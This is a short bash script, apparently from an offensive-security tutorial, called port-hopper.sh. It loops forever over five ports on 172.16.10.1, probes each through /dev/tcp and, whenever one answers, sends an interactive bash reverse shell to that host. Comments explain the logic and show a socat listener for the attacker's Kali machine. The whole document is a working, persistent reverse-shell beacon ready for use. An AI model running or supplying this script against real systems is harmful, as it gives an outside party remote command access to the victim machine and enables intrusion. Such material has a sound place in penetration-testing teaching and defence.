#!/bin/bash
TARGET="172.16.10.1"
PORTS=("34455" "34456" "34457" "34458" "34459")


listener_is_reachable() {
    local port="${1}"
    if timeout 0.5 bash -c "</dev/tcp/${TARGET}/${port}" 2> /dev/null; then
        return 0
    else
        return 1
    fi
}


connect_reverse_shell() {
    local port="${1}"
    bash -i >& "/dev/tcp/${TARGET}/${port}" 0>&1
}


while true; do
    for port in "${PORTS[@]}"; do
        if listener_is_reachable "${port}"; then
            echo "Port ${port} is reachable; attempting a connection."
            connect_reverse_shell "${port}"
        else
            echo "Port ${port} is not reachable."
        fi
    done

    echo "Sleeping for 10 seconds before the next attempt..."
    sleep 10
done


# This script sets a few predefined ports in an array: 34455, 34456, 34457,
# 34458, and 34459. An infinite while loop continuously attempts to connect 
# to the listener. We then iterate through the ports by using a for loop and
# check whether each port is reachable by using the listener_is_reachable()
# function, which uses the special /dev/tcp device. Notice that we prepend
# the reachability check with the timeout command to ensure that the command 
# exits at a set interval of 0.5 seconds. If the port is reachable, we call
# the connect_reverse_shell() function, passing the open port as an argument, 
# and send an interactive shell to it using /dev/tcp.

# As we're performing multiple network connections consecutively (one for the
# connectivity check and another to establish the reverse shell), some
# verions of Netcat may not support keeping the listener alive. To overcome
# this, we can use socat to set up a TCP listener on the Kali box. This tool
# will ensure that the listner remains alive:
# # $ socat - tcp-listen:34459,fork
# $ ./port-hopper.sh    # to run
